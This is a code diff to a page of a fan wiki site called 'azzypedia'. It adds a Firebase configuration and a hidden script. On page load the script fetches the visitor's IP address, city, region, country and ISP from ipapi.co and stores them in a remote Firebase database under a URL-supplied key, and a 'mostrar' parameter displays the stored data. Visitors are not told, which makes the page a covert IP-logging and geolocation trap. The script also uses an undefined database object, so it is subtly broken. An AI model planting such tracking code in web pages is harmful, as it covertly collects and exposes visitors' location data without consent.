@@ -143,7 +143,61 @@
   </style>
 </head>
 <body>
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js"></script>
+<script>
+const firebaseConfig = {
+apiKey: "AIzaSyDa0qObFuL4QCRwkaz0qNQiEZ8MCrm6g0I",
+authDomain: "azzypedia-c.firebaseapp.com",
+databaseURL: "https://azzypedia-c-default-rtdb.europe-west1.firebasedatabase.app",
+projectId: "azzypedia-c",
+storageBucket: "azzypedia-c.firebasestorage.app",
+messagingSenderId: "180939034442",
+appId: "1:180939034442:web:cca503f7112f93b2fdbbb3"
+  };
+</script>
 
+<script>
+const params = new URLSearchParams(window.location.search);
+const key = params.get("k");
+const mostrar = params.has("mostrar");
+
+// Obtener datos de IP + región
+fetch("https://ipapi.co/json/")
+  .then(res => res.json())
+  .then(data => {
+    const info = {
+      ip: data.ip,
+      region: data.region,
+      ciudad: data.city,
+      pais: data.country_name,
+      isp: data.org
+    };
+
+    if (mostrar) {
+      db.ref("ips/" + key).once("value").then(snapshot => {
+        const datos = snapshot.val();
+        if (!datos) {
+          document.body.innerHTML += `<p>No hay datos para la clave "${key}".</p>`;
+          return;
+        }
+
+        document.body.innerHTML += `
+          <p><b>IP:</b> ${datos.ip}</p>
+          <p><b>Región:</b> ${datos.region}</p>
+          <p><b>Ciudad:</b> ${datos.ciudad}</p>
+          <p><b>País:</b> ${datos.pais}</p>
+          <p><b>ISP:</b> ${datos.isp}</p>
+        `;
+      });
+    } else {
+      db.ref("ips/" + key).set(info);
+      document.body.innerHTML += `<p>Datos guardados correctamente.</p>`;
+    }
+  });
+</script>
+
+  
 <header>
   <h1>
     <a href="https://thebrucepro.github.io/azzypedia/#"><img src="https://thebrucepro.github.io/azzypedia/logo_nuevo.jpg" alt="Logo Azzy hecho por Luigiova44" style="height: 120px; margin: 10px auto; border-radius: 10px;"></a>
